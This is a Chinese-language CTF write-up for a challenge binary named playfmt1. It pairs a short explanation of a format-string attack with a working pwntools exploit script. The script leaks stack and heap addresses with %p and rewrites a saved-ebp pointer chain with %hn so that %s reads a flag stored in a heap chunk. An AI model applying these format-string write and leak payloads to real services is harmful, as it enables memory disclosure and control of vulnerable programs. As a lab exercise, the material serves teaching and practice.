分析

首先看一下输入aaaaa之后栈中的情况：

我们看到0xffffd148 —▸ 0xffffd168 —▸ 0xffffd198 ◂— 0x0 和 0xffffd178 —▸ 0x8050b90。其中0x8050b90是在堆上，而我们的 flag 也存在堆上：

0x8050b68 FASTBIN {
  mchunk_prev_size = 0x0
  mchunk_size = 0x21
  fd = 0x67616c66
  bk = 0x3131317b
  fd_nextsize = 0x31313131
  bk_nextsize = 0x31313131
}

思路就是通过格式化字符串漏洞：

  1. 修改0xffffd168指向0xffffd178，这样链就变成了0xffffd148 —▸ 0xffffd168 —▸ 0xffffd178 —▸ 0x8050b90
  2. 修改0xffffd178指向我们 flag 的地址，修改 0xb90 为 0xb70
  3. 通过 %s 读出 flag 的内容

EXP

from pwn import *
#context.log_level = 'debug'

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process('./playfmt1')
elf = ELF('./playfmt1')

p.recv()

pay = '%6$p'
p.sendline(pay)
ebp_2 = int(p.recv(),16)
stack = ebp_2 -0x38

p.sendline('%18$p')
flag_addr = int(p.recv(),16) -0x28+0x8

ffff=(stack+18*4)&0xffff
p.sendline("%"+str(ffff)+"c%6$hn") #ebp2 -> p ->heap
p.recv()

p.sendline("aaaa%2928c%14$hn")    #ebp_2 -> p-> flag
p.recvuntil('aaaa')

if flag_addr&0xffff==0xb70:
    p.sendline("aaaa%18$s")
    p.recvuntil('aaaa')
    flag=p.recv()
    log.success("flag: "+flag)
p.close()

p.interactive()
